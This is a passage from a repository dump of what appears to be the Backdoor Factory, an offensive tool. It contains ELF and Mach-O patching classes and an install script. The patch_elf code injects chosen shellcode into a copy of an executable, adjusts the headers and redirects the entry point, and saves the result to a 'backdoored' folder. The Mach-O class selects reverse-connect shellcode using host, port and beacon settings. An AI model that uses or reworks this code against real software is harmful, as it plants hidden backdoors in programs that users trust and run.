= struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.prog_hdr[i]['p_vaddr'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.prog_hdr[i]['p_paddr'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.prog_hdr[i]['p_filesz'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.prog_hdr[i]['p_memsz'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.prog_hdr[i]['p_flags'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.prog_hdr[i]['p_align'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n            else:\n                if self.e_phoff + (self.e_phnum * ((4 * 2) + (6 * 8))) > self.file_size:\n                    print \"[!] e_phoff and e_phnum is greater than the file size\"\n                    return False\n                self.prog_hdr[i]['p_type'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.prog_hdr[i]['p_flags'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.prog_hdr[i]['p_offset'] = struct.unpack(self.endian + \"Q\", bin.read(8))[0]\n                self.prog_hdr[i]['p_vaddr'] = struct.unpack(self.endian + \"Q\", bin.read(8))[0]\n                self.prog_hdr[i]['p_paddr'] = struct.unpack(self.endian + \"Q\", bin.read(8))[0]\n                self.prog_hdr[i]['p_filesz'] = struct.unpack(self.endian + \"Q\", bin.read(8))[0]\n                self.prog_hdr[i]['p_memsz'] = struct.unpack(self.endian + \"Q\", bin.read(8))[0]\n                self.prog_hdr[i]['p_align'] = struct.unpack(self.endian + \"Q\", bin.read(8))[0]\n            if self.prog_hdr[i]['p_type'] == 0x1 and self.prog_hdr[i]['p_vaddr'] < self.e_entry:\n                self.offset_addr = self.prog_hdr[i]['p_vaddr']\n                self.LocOfEntryinCode = self.e_entry - self.offset_addr\n                #print \"found the entry offset\"\n\n        if self.e_shoff > self.file_size:\n            print \"[!] e_shoff location is greater than file size\"\n            return False\n        if self.e_shnum  > self.file_size:\n            print \"[!] e_shnum is greater than file size\"\n            return False    \n        bin.seek(self.e_shoff, 0)\n        self.sec_hdr = {}\n        for i in range(self.e_shnum):\n            self.sec_hdr[i] = {}\n            if self.EI_CLASS == 0x01:\n                if self.e_shoff + self.e_shnum * 4 *10 > self.file_size:\n                    print \"[!] e_shnum is greater than file size\"\n                    return False    \n                self.sec_hdr[i]['sh_name'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.sec_hdr[i]['sh_type'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.sec_hdr[i]['sh_flags'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.sec_hdr[i]['sh_addr'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.sec_hdr[i]['sh_offset'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.sec_hdr[i]['sh_size'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.sec_hdr[i]['sh_link'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.sec_hdr[i]['sh_info'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.sec_hdr[i]['sh_addralign'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.sec_hdr[i]['sh_entsize'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n            else:\n                if self.e_shoff + self.e_shnum * ((4 * 4) + (6 * 8))   > self.file_size:\n                    print \"[!] e_shnum is greater than file size\"\n                    return False\n                self.sec_hdr[i]['sh_name'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.sec_hdr[i]['sh_type'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.sec_hdr[i]['sh_flags'] = struct.unpack(self.endian + \"Q\", bin.read(8))[0]\n                self.sec_hdr[i]['sh_addr'] = struct.unpack(self.endian + \"Q\", bin.read(8))[0]\n                self.sec_hdr[i]['sh_offset'] = struct.unpack(self.endian + \"Q\", bin.read(8))[0]\n                self.sec_hdr[i]['sh_size'] = struct.unpack(self.endian + \"Q\", bin.read(8))[0]\n                self.sec_hdr[i]['sh_link'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.sec_hdr[i]['sh_info'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.sec_hdr[i]['sh_addralign'] = struct.unpack(self.endian + \"Q\", bin.read(8))[0]\n                self.sec_hdr[i]['sh_entsize'] = struct.unpack(self.endian + \"Q\", bin.read(8))[0]\n        \n        if self.set_section_name() is False:\n            print \"[!] Fuzzing sections\"\n            return False\n        if self.e_type != 0x2:\n            print \"[!] Only supporting executable elf e_types, things may get weird.\"\n\n        return True\n\n    def output_options(self):\n        \"\"\"\n        Output file check.\n        \"\"\"\n        if not self.OUTPUT:\n            self.OUTPUT = os.path.basename(self.FILE)\n\n    def patch_elf(self):\n        '''\n        Circa 1998: http://vxheavens.com/lib/vsc01.html  <--Thanks to elfmaster\n        6. Increase p_shoff by PAGE_SIZE in the ELF header\n        7. Patch the insertion code (parasite) to jump to the entry point (original)\n        1. Locate the text segment program header\n            -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)\n            -Increase p_filesz by account for the new code (parasite)\n            -Increase p_memsz to account for the new code (parasite)\n        2. For each phdr who's segment is after the insertion (text segment)\n            -increase p_offset by PAGE_SIZE\n        3. For the last shdr in the text segment\n            -increase sh_len by the parasite length\n        4. For each shdr who's section resides after the insertion\n            -Increase sh_offset by PAGE_SIZE\n        5. Physically insert the new code (parasite) and pad to PAGE_SIZE,\n            into the file - text segment p_offset + p_filesz (original)\n        '''\n\n        self.support_check()\n        \n        if self.supported is False:\n            print \"[!] ELF Binary not supported\"\n            return False\n\n        gather_result = self.gather_file_info()\n        if gather_result is False:\n            print \"[!] Are you fuzzing?\"\n            return False\n        \n        self.output_options()\n\n        if self.PREPROCESS is True:\n            print \"True\"\n            self.preprocess()\n\n        if not os.path.exists(\"backdoored\"):\n            os.makedirs(\"backdoored\")\n        os_name = os.name\n        if os_name == 'nt':\n            self.backdoorfile = \"backdoored\\\\\" + self.OUTPUT\n        else:\n            self.backdoorfile = \"backdoored/\" + self.OUTPUT\n\n        shutil.copy2(self.FILE, self.backdoorfile)\n\n        print \"[*] Getting shellcode length\"\n\n        resultShell = self.set_shells()\n        if resultShell is False:\n            print \"[!] Could not set shell\"\n            return False\n        self.bin_file = open(self.backdoorfile, \"r+b\")\n\n        newBuffer = len(self.shellcode)\n\n        self.bin_file.seek(24, 0)\n\n        headerTracker = 0x0\n        PAGE_SIZE = 4096\n        newOffset = None\n        #find range of the first PT_LOAD section\n        for header, values in self.prog_hdr.iteritems():\n            #print 'program header', header, values\n            if values['p_flags'] == 0x5 and values['p_type'] == 0x1:\n                #print \"Found text segment\"\n                self.shellcode_vaddr = values['p_vaddr'] + values['p_filesz']\n                beginOfSegment = values['p_vaddr']\n                oldentry = self.e_entry\n                sizeOfNewSegment = values['p_memsz'] + newBuffer\n                LOCofNewSegment = values['p_filesz'] + newBuffer\n                headerTracker = header\n                newOffset = values['p_offset'] + values['p_filesz']\n\n        #now that we have the shellcode startpoint, reassgin shellcode,\n        #  there is no change in size\n        print \"[*] Setting selected shellcode\"\n\n        resultShell = self.set_shells()\n\n        #SPLIT THE FILE\n        self.bin_file.seek(0)\n        if newOffset > 4294967296 or newOffset is None:\n            print \"[!] Fuzz Fuzz Fuzz the bin\"\n            return False\n        if newOffset > self.file_size:\n            print \"[!] The file is really not that big\"\n            return False\n        \n        file_1st_part = self.bin_file.read(newOffset)\n        #print file_1st_part.encode('hex')\n        newSectionOffset = self.bin_file.tell()\n        file_2nd_part = self.bin_file.read()\n\n        self.bin_file.close()\n        #print \"Reopen file for adjustments\"\n        self.bin_file = open(self.backdoorfile, \"w+b\")\n        self.bin_file.write(file_1st_part)\n        self.bin_file.write(self.shellcode)\n        self.bin_file.write(\"\\x00\" * (PAGE_SIZE - len(self.shellcode)))\n        self.bin_file.write(file_2nd_part)\n        if self.EI_CLASS == 0x01:\n            #32 bit FILE\n            #update section header table\n            print \"[*] Patching x86 Binary\"\n            self.bin_file.seek(24, 0)\n            self.bin_file.seek(8, 1)\n            if self.e_shoff + PAGE_SIZE > 4294967296:\n                print \"[!] Such fuzz...\"\n                return False\n            self.bin_file.write(struct.pack(self.endian + \"I\", self.e_shoff + PAGE_SIZE))\n            self.bin_file.seek(self.e_shoff + PAGE_SIZE, 0)\n            for i in range(self.e_shnum):\n                #print \"i\", i, self.sec_hdr[i]['sh_offset'], newOffset\n                if self.sec_hdr[i]['sh_offset'] >= newOffset:\n                    #print \"Adding page size\"\n                    if self.sec_hdr[i]['sh_offset'] + PAGE_SIZE > 4294967296:\n                        print \"[!] Melkor is cool right?\"\n                        return False\n                    self.bin_file.seek(16, 1)\n                    self.bin_file.write(struct.pack(self.endian + \"I\", self.sec_hdr[i]['sh_offset'] + PAGE_SIZE))\n                    self.bin_file.seek(20, 1)\n                elif self.sec_hdr[i]['sh_size'] + self.sec_hdr[i]['sh_addr'] == self.shellcode_vaddr:\n                    #print \"adding newBuffer size\"\n                    if self.sec_hdr[i]['sh_offset'] + newBuffer > 4294967296:\n                        print \"[!] Someone is fuzzing...\"\n                        return False\n                    self.bin_file.seek(20, 1)\n                    self.bin_file.write(struct.pack(self.endian + \"I\", self.sec_hdr[i]['sh_size'] + newBuffer))\n                    self.bin_file.seek(16, 1)\n                else:\n                    self.bin_file.seek(40, 1)\n            #update the pointer to the section header table\n            after_textSegment = False\n            self.bin_file.seek(self.e_phoff, 0)\n            for i in range(self.e_phnum):\n                #print \"header range i\", i\n                #print \"self.shellcode_vaddr\", hex(self.prog_hdr[i]['p_vaddr']), hex(self.shellcode_vaddr)\n                if i == headerTracker:\n                    #print \"Found Text Segment again\"\n                    after_textSegment = True\n                    self.bin_file.seek(16, 1)\n           \n                    if self.prog_hdr[i]['p_filesz'] + newBuffer > 4294967296:\n                        print \"[!] Melkor you fuzzer you...\"\n                        return False\n                    if self.prog_hdr[i]['p_memsz'] + newBuffer > 4294967296:\n                        print \"[!] Someone is a fuzzing...\"\n                        return False\n                    self.bin_file.write(struct.pack(self.endian + \"I\", self.prog_hdr[i]['p_filesz'] + newBuffer))\n                    self.bin_file.write(struct.pack(self.endian + \"I\", self.prog_hdr[i]['p_memsz'] + newBuffer))\n                    self.bin_file.seek(8, 1)\n                elif after_textSegment is True:\n                    #print \"Increasing headers after the addition\"\n                    self.bin_file.seek(4, 1)\n                    if self.prog_hdr[i]['p_offset'] + PAGE_SIZE > 4294967296:\n                        print \"[!] Nice Fuzzer!\"\n                        return False\n                    self.bin_file.write(struct.pack(self.endian + \"I\", self.prog_hdr[i]['p_offset'] + PAGE_SIZE))\n                    self.bin_file.seek(24, 1)\n                else:\n                    self.bin_file.seek(32, 1)\n\n            self.bin_file.seek(self.e_entryLocOnDisk, 0)\n            if self.shellcode_vaddr >= 4294967295:\n                print \"[!] Oh hai Fuzzer!\"\n                return False\n            self.bin_file.write(struct.pack(self.endian + \"I\", self.shellcode_vaddr))\n\n            self.JMPtoCodeAddress = self.shellcode_vaddr - self.e_entry - 5\n\n        else:\n            #64 bit FILE\n            print \"[*] Patching x64 Binary\"\n            self.bin_file.seek(24, 0)\n            self.bin_file.seek(16, 1)\n            if self.e_shoff + PAGE_SIZE > 0x7fffffffffffffff:\n                print \"[!] Such fuzz...\"\n                return False\n            self.bin_file.write(struct.pack(self.endian + \"I\", self.e_shoff + PAGE_SIZE))\n            self.bin_file.seek(self.e_shoff + PAGE_SIZE, 0)\n            for i in range(self.e_shnum):\n                #print \"i\", i, self.sec_hdr[i]['sh_offset'], newOffset\n                if self.sec_hdr[i]['sh_offset'] >= newOffset:\n                    #print \"Adding page size\"\n                    self.bin_file.seek(24, 1)\n                    if self.sec_hdr[i]['sh_offset'] + PAGE_SIZE > 0x7fffffffffffffff:\n                        print \"[!] Fuzzing...\"\n                        return False\n                    self.bin_file.write(struct.pack(self.endian + \"Q\", self.sec_hdr[i]['sh_offset'] + PAGE_SIZE))\n                    self.bin_file.seek(32, 1)\n                elif self.sec_hdr[i]['sh_size'] + self.sec_hdr[i]['sh_addr'] == self.shellcode_vaddr:\n                    #print \"adding newBuffer size\"\n                    self.bin_file.seek(32, 1)\n                    if self.sec_hdr[i]['sh_offset'] + newBuffer > 0x7fffffffffffffff:\n                        print \"[!] Melkor is cool right?\"\n                        return False\n                    self.bin_file.write(struct.pack(self.endian + \"Q\", self.sec_hdr[i]['sh_size'] + newBuffer))\n                    self.bin_file.seek(24, 1)\n                else:\n                    self.bin_file.seek(64, 1)\n            #update the pointer to the section header table\n            after_textSegment = False\n            self.bin_file.seek(self.e_phoff, 0)\n            for i in range(self.e_phnum):\n                #print \"header range i\", i\n                #print \"self.shellcode_vaddr\", hex(self.prog_hdr[i]['p_vaddr']), hex(self.shellcode_vaddr)\n                if i == headerTracker:\n                    #print \"Found Text Segment again\"\n                    after_textSegment = True\n                    self.bin_file.seek(32, 1)\n                    if self.prog_hdr[i]['p_filesz'] + newBuffer > 0x7fffffffffffffff:\n                        print \"[!] Fuzz fuzz fuzz... \"\n                        return False\n                    if self.prog_hdr[i]['p_memsz'] + newBuffer > 0x7fffffffffffffff:\n                        print \"[!] Someone is fuzzing...\"\n                        return False\n                    self.bin_file.write(struct.pack(self.endian + \"Q\", self.prog_hdr[i]['p_filesz'] + newBuffer))\n                    self.bin_file.write(struct.pack(self.endian + \"Q\", self.prog_hdr[i]['p_memsz'] + newBuffer))\n                    self.bin_file.seek(8, 1)\n                elif after_textSegment is True:\n                    #print \"Increasing headers after the addition\"\n                    self.bin_file.seek(8, 1)\n                    if self.prog_hdr[i]['p_offset'] + PAGE_SIZE > 0x7fffffffffffffff:\n                        print \"[!] Nice fuzzer!\"\n                        return False\n                    self.bin_file.write(struct.pack(self.endian + \"Q\", self.prog_hdr[i]['p_offset'] + PAGE_SIZE))\n                    self.bin_file.seek(40, 1)\n                else:\n                    self.bin_file.seek(56, 1)\n\n            self.bin_file.seek(self.e_entryLocOnDisk, 0)\n            if self.shellcode_vaddr > 0x7fffffffffffffff:\n                print \"[!] Fuzzing...\"\n                return False\n            self.bin_file.write(struct.pack(self.endian + \"Q\", self.shellcode_vaddr))\n\n            self.JMPtoCodeAddress = self.shellcode_vaddr - self.e_entry - 5\n\n        self.bin_file.close()\n\n        print \"[!] Patching Complete\"\n\n        if self.tmp_file != None:\n        \n            if self.keep_temp is True:\n                # tmpfilename_orginalname.exe\n                print \"[*] Saving TempFile to:\", os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE \n                shutil.copy2(self.FILE, os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE )\n            try:\n                shutil.rmtree(self.tmp_file.name)\n            except: # OSError:\n                pass\n                #print \"[*] TempFile already removed.\"\n\n        return True\n\n# END elfbin clas\n"
        },
        {
          "name": "install.sh",
          "type": "blob",
          "size": 2.4091796875,
          "content": "#!/usr/bin/env bash\n\n#depends:\n# capstone (newest)\n# pefile\n# python-capstone\n# autoconf\n\n\nif [[ $EUID -ne 0 ]]; then\n  echo \"You must be root\" 2>&1\n  exit 1\nfi\n\n#check if kali\nuname -a | grep -i kali &> /dev/null \nif [ $? -eq 0 ]; then\n\tapt-get update\n\tapt-get install -y python-capstone autoconf libtool curl libcurl4-openssl-dev\n\n\techo '[*] Install osslsigncode'\n    cd osslsigncode\n    ./autogen.sh\n    ./configure\n\tmake\n\tmake install\n    cd ..\t\n\n\t#install appack\n\tuname -a | grep -i \"armv\" &> /dev/null\n\tif [ $? -ne 0 ]; then\n                echo \"[*] installing appack for onionduke\"\n\t\tsudo apt-get install -y libc6-dev-i386\n\t\tcd ./aPLib/example/\n\t\tgcc -c -I../lib/elf -m32 -Wall -O2 -s -o appack.o appack.c -v \n\t\tgcc -m32 -Wall -O2 -s -o appack appack.o ../lib/elf/aplib.a -v \n\t\tsudo cp ./appack /usr/bin/appack\t\n\telse\n\t\techo \"Arm not supported for aPLib\"\n\tfi\nfi\n\n#other linux\nuname -a | grep -v \"kali\" | grep -i linux &> /dev/null \nif [ $? -eq 0 ]; then\n\n\tif hash pip 2>/dev/null; then\n\t\tsudo apt-get install -y python-pip autoconf libtool curl libcurl4-openssl-dev\n\t        pip install pefile\n\t        #install capstone\n\t\tpip install capstone\n\telse\n\t        echo '[!!!!] Install pefile and capstone manually, pip is not installed'\n\t        echo '[!!!!] or install pip and retry'\n\t        echo \"\"\n\tfi\n\t\n\techo '[*] Install osslsigncode'\n    cd osslsigncode\n    ./autogen.sh\n    ./configure\n\tmake\n\tmake install\n    cd ..\t\n\n\tuname -a | grep -i \"armv\" &> /dev/null\n        if [ $? -ne 0 ]; then\n                echo \"[*] installing appack for onionduke\"\n\t\techo \"[*] installing dependences\"\n\t\tsudo apt-get install libc6-dev-i386\n                cd ./aPLib/example/\n                gcc -c -I../lib/elf -m32 -Wall -O2 -s -o appack.o appack.c -v \n                gcc -m32 -Wall -O2 -s -o appack appack.o ../lib/elf/aplib.a -v \n                sudo cp ./appack /usr/bin/appack        \n        else\n                echo \"[!!!!] Arm not supported for aPLib\"\n\tfi\nfi\n\n#OS X appack install\nuname -a | grep -i Darwin &> /dev/null\nif [ $? -eq 0 ]; then\n\tbrew install autoconf\n\tbrew install automake\n\tbrew install libtool\n\t\n\tpip install pefile\n\tpip install capstone\n\t\n\techo '[*] Install osslsigncode'\n    \tcd osslsigncode\n    \t./autogen.sh\n    \t./configure\n\tmake\n\tmake install\n    cd ..\t\n\n\tcd ./aPLib/example/\n\tclang -c -I../lib/macho64 -Wall -O2  -o appack.o appack.c -v \n\tclang -Wall -O2  -o appack appack.o ../lib/macho64/aplib.a -v \n\tcp ./appack /usr/local/bin/appack\nfi\n\n"
        },
        {
          "name": "intel",
          "type": "tree",
          "content": null
        },
        {
          "name": "machobin.py",
          "type": "blob",
          "size": 29.4287109375,
          "content": "#!/usr/bin/env python\n'''\n\nCopyright (c) 2013-2017, Joshua Pitts\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without modification,\nare permitted provided that the following conditions are met:\n\n    1. Redistributions of source code must retain the above copyright notice,\n    this list of conditions and the following disclaimer.\n\n    2. Redistributions in binary form must reproduce the above copyright notice,\n    this list of conditions and the following disclaimer in the documentation\n    and/or other materials provided with the distribution.\n\n    3. Neither the name of the copyright holder nor the names of its contributors\n    may be used to endorse or promote products derived from this software without\n    specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\nAND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\nIMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\nARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE\nLIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\nCONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\nSUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\nINTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\nCONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\nARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\nPOSSIBILITY OF SUCH DAMAGE.\n\n'''\n\nimport os\nimport struct\nimport shutil\nimport tempfile\nimport sys\nfrom intel.MachoIntel64 import macho_intel64_shellcode\nfrom intel.MachoIntel32 import macho_intel32_shellcode\n\n\nclass machobin():\n\n    def __init__(self, FILE, OUTPUT=None, SHELL=None, HOST=\"127.0.0.1\", PORT=8080,\n                 SUPPORT_CHECK=False, SUPPLIED_SHELLCODE=None, FAT_PRIORITY=\"x64\",\n                 BEACON=15, PREPROCESS=False\n                 ):\n        self.FILE = FILE\n        self.OUTPUT = OUTPUT\n        self.fat_hdrs = {}\n        self.mach_hdrs = {}\n        self.load_cmds = {}\n        self.ImpValues = {}\n        self.jumpLocation = 0x0\n        self.PORT = PORT\n        self.HOST = HOST\n        self.SHELL = SHELL\n        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE\n        self.SUPPORT_CHECK = SUPPORT_CHECK\n        self.FAT_FILE = False\n        self.FAT_PRIORITY = FAT_PRIORITY\n        self.BEACON = BEACON\n        self.PREPROCESS = PREPROCESS\n        self.ORIGINAL_FILE = self.FILE\n        self.tmp_file = None\n        self.keep_temp = False\n        self.supported_CPU_TYPES = [0x7,  # i386\n                                    0x01000007  # x64\n                                    ]\n\n    def run_this(self):\n        'The Engine'\n        self.bin = open(self.FILE, 'r+b')\n        self.supported = ''\n        if self.SUPPORT_CHECK is True:\n            #Exit out either way\n            if not self.FILE:\n                print \"You must provide a file to see if it is supported (-f)\"\n                return False\n            try:\n                self.support_check()\n            except Exception, e:\n                print 'Exception:', str(e), '%s' % self.FILE\n            if self.supported is False:\n                print \"%s is not supported.\" % self.FILE\n                return False\n            else:\n                print \"%s is supported.\" % self.FILE\n                return True\n\n        self.support_check()\n        result = self.patch_macho()\n        return result\n\n    def support_check(self):\n        print \"[*] Checking file support\"\n        with open(self.FILE, 'r+b') as self.bin:\n            check = self.get_structure()\n            if check is False:\n                self.supported = False\n\n            for key, value in self.load_cmds.iteritems():\n                self.ImpValues[key] = self.find_Needed_Items(value)\n                if self.ImpValues[key]['text_segment'] == {}:\n                    print '[!] Not a proper Mach-O file'\n                    self.supported = False\n\n    \n    def loadthis(self, amod):\n        section = amod.split('.')\n        mod = \".\".join(section[:-1])\n        amod = __import__(mod)\n        for item in section[1:]:\n            amod = getattr(amod, item)\n        return amod\n\n    def preprocess(self):\n        # files in directory\n        ignore = ['__init__.py']\n        abspath = os.path.abspath(__file__)\n        dname = os.path.dirname(abspath)\n        sys.path.append(dname)\n        for afile in os.listdir(dname + \"/preprocessor\"):\n            if afile in ignore:\n                continue\n            if \".pyc\" in afile:\n                continue\n            \n            if len(afile.split(\".\")) > 2:\n                print \"!\" * 50\n                print \"\\t[!] Make sure there are no '.' in your preprocessor filename:\", afile\n                print \"!\" * 50\n                \n                return False\n            \n            name = \"preprocessor.\" +  afile.strip(\".py\")\n            \n            preprocessor_name = __import__( name, fromlist=[''])\n            \n            if preprocessor_name.enabled is True:\n                print \"[*] Executing preprocessor:\", afile.strip(\".py\")\n            else:\n                continue\n\n            if preprocessor_name.file_format.lower() in ['macho', 'all']: #'elf', 'macho', 'mach-o']:\n                print '[*] Running preprocessor', afile.strip(\".py\"), \"against\", preprocessor_name.file_format, \"formats\"\n            else:\n                continue\n            \n            # Allow if any processors to keep it \n            if self.keep_temp is False:\n                self.keep_temp = preprocessor_name.keep_temp\n            \n            # create tempfile here always\n            \n            if self.tmp_file == None:\n                self.tmp_file = tempfile.NamedTemporaryFile()\n                self.tmp_file.write(open(self.FILE, 'rb').read())\n                self.tmp_file.seek(0)\n                print \"[*] Creating temp file:\", self.tmp_file.name\n            else:\n                print \"[*] Using existing tempfile from prior preprocessor\"\n            \n            load_name = name +  \".preprocessor\"\n            preproc = self.loadthis(load_name)\n            \n            m = preproc(self)\n            \n            print \"=\" * 50\n            \n            # execute preprocessor\n            result = m.run()\n            \n            if result is False:\n                print \"[!] Preprocessor Failure :(\"\n\n            print \"=\" * 50\n            \n            # After running push it to BDF.\n            \n            self.FILE = self.tmp_file.name[:]\n    \n            # check for support after each modification\n            if preprocessor_name.recheck_support is True:\n                issupported = self.support_check()\n                if issupported is False:\n                    print self.FILE, \"is not supported.\"\n                    return False                \n\n    def output_options(self):\n        \"\"\"\n        Output file check.\n        \"\"\"\n        if not self.OUTPUT:\n            self.OUTPUT = os.path.basename(self.FILE)\n\n    def set_shells(self, MagicNumber, ):\n        \"This function sets the shellcode.\"\n\n        print \"[*] Looking for and setting selected shellcode\"\n\n        avail_shells = []\n\n        self.bintype = False\n        if MagicNumber == '0xfeedface':\n            #x86\n            self.bintype = macho_intel32_shellcode\n        elif MagicNumber == '0xfeedfacf':\n            #x64\n            self.bintype = macho_intel64_shellcode\n\n        if not self.SHELL:\n            print \"You must choose a backdoor to add: \"\n            for item in dir(self.bintype):\n                if \"__\" in item:\n                    continue\n                elif (\"returnshellcode\" == item\n                      or \"pack_ip_addresses\" == item\n                      or \"eat_code_caves\" == item\n                      or 'ones_compliment' == item\n                      or 'resume_execution' in item\n                      or 'returnshellcode' in item):\n                    continue\n                else:\n                    print \"   {0}\".format(item)\n            return False\n        if self.SHELL not in dir(self.bintype):\n            print \"The following %ss are available:\" % str(self.bintype).split(\".\")[1]\n            for item in dir(self.bintype):\n                #print item\n                if \"__\" in item:\n                    continue\n                elif (\"returnshellcode\" == item\n                      or \"pack_ip_addresses\" == item\n                      or \"eat_code_caves\" == item\n                      or 'ones_compliment' == item\n                      or 'resume_execution' in item\n                      or 'returnshellcode' in item):\n                    continue\n                else:\n                    print \"   {0}\".format(item)\n                    avail_shells.append(item)\n            self.avail_shells = avail_shells\n            return False\n        #else:\n        #    shell_cmd = self.SHELL + \"()\"\n        self.shells = self.bintype(self.HOST, self.PORT, self.jumpLocation, self.SUPPLIED_SHELLCODE, self.BEACON)\n        self.allshells = getattr(self.shells, self.SHELL)()\n        self.shellcode = self.shells.returnshellcode()\n        return self.shellcode\n\n    def get_structure(self):\n        '''This function grabs necessary data for the mach-o format'''\n        self.binary_header = self.bin.read(4)\n        if self.binary_header == \"\\xca\\xfe\\xba\\xbe\":\n            print '[*] Fat File detected'\n            self.FAT_FILE = True\n            ArchNo = struct.unpack(\">I\", self.bin.read(4))[0]\n            for arch in range(ArchNo):\n                self.fat_hdrs[arch] = self.fat_header()\n            for hdr, value in self.fat_hdrs.iteritems():\n                if int(value['CPU Type'], 16) in self.supported_CPU_TYPES:\n                    self.bin.seek(int(value['Offset'], 16), 0)\n                    self.mach_hdrs[hdr] = self.mach_header()\n                    self.load_cmds[hdr] = self.parse_loadcommands(self.mach_hdrs[hdr])\n            if self.mach_hdrs is False:\n                return False\n        else:\n            #Not Fat Header\n            self.bin.seek(0)\n            self.mach_hdrs[0] = self.mach_header()\n            self.load_cmds[0] = self.parse_loadcommands(self.mach_hdrs[0])\n\n    def fat_header(self):\n        header = {}\n        header[\"CPU Type\"] = hex(struct.unpack(\">I\", self.bin.read(4))[0])\n        header[\"CPU SubType\"] = hex(struct.unpack(\">I\", self.bin.read(4))[0])\n        header[\"Offset\"] = hex(struct.unpack(\">I\", self.bin.read(4))[0])\n        header[\"Size\"] = hex(struct.unpack(\">I\", self.bin.read(4))[0])\n        header[\"Align\"] = hex(struct.unpack(\">I\", self.bin.read(4))[0])\n        return header\n\n    def mach_header(self):\n        header = {}\n        header['beginningOfHeader'] = self.bin.tell()\n        try:\n            header['MagicNumber'] = hex(struct.unpack(\"<I\", self.bin.read(4))[0])\n        except:\n            print \"[!] Not a properly formated Mach-O file\"\n            return False\n        header['CPU Type'] = hex(struct.unpack(\"<I\", self.bin.read(4))[0])\n        header['CPU SubType'] = hex(struct.unpack(\"<I\", self.bin.read(4))[0])\n        header['File Type'] = hex(struct.unpack(\"<I\", self.bin.read(4))[0])\n        header['LOCLoadCmds'] = self.bin.tell()\n        header['Load Cmds'] = hex(struct.unpack(\"<I\", self.bin.read(4))[0])\n        header['LOCSizeLdCmds'] = self.bin.tell()\n        header['Size Load Cmds'] = hex(struct.unpack(\"<I\", self.bin.read(4))[0])\n        header['Flags'] = hex(struct.unpack(\"<I\", self.bin.read(4))[0])\n        if header['MagicNumber'] == '0xfeedfacf':\n            header['Reserved'] = hex(struct.unpack(\"<I\", self.bin.read(4))[0])\n        header['endOfHeader'] = self.bin.tell()\n        return header\n\n    def parse_loadcommands(self, someHdrs):\n        #print int(someHdrs['Load Cmds'], 16)\n        overall_cmds = []\n        for section in range(int(someHdrs['Load Cmds'], 16)):\n            cmds = {}\n            cmds['Command'] = struct.unpack(\"<I\", self.bin.read(4))[0]\n            cmds['CommandSize'] = struct.unpack(\"<I\", self.bin.read(4))[0]\n            cmds['LOCInFIle'] = self.bin.tell()\n            cmds['DATA'] = self.bin.read(int(cmds['CommandSize']) - 8)\n            cmds['last_cmd'] = self.bin.tell()\n            overall_cmds.append(cmds)\n\n        return overall_cmds\n\n    def find_Needed_Items(self, theCmds):\n        '''\n        This method returns a dict with commands that we need\n        for mach-o patching\n        '''\n        _tempDict = {}\n        text_segment = {}\n        text_section = {}\n        LC_MAIN = {}\n        LC_UNIXTREAD = {}\n        LC_CODE_SIGNATURE = {}\n        LC_DYLIB_CODE_SIGN_DRS = {}\n\n        locationInFIle = 0\n        last_cmd = 0\n        for item in theCmds:\n            locationInFIle = item['LOCInFIle']\n            if item['DATA'][0:6] == \"__TEXT\" and item['Command'] == 0x01:\n                text_segment = {\n                    'segname': item['DATA'][0:0x10],\n                    'VMAddress': item['DATA'][0x10:0x14],\n                    'VMSize': item['DATA'][0x14:0x18],\n                    'File Offset': item['DATA'][0x18:0x1C],\n                    'File Size': item['DATA'][0x1C:0x20],\n                    'MaxVMProt': item['DATA'][0x20:0x24],\n                    'InitalVMProt': item['DATA'][0x24:0x28],\n                    'NumberOfSections': item['DATA'][0x28:0x2C],\n                    'Flags': item['DATA'][0x2C:0x30]\n                }\n\n                count = struct.unpack(\"<I\", text_segment['NumberOfSections'])[0]\n                i = 0\n                while count > 0:\n                    if '__text' in item['DATA'][0x30 + i:0x40 + i]:\n                        text_section = {\n                            'sectionName': item['DATA'][0x30 + i:0x40 + i],\n                            'segmentName': item['DATA'][0x40 + i:0x50 + i],\n                            'Address': 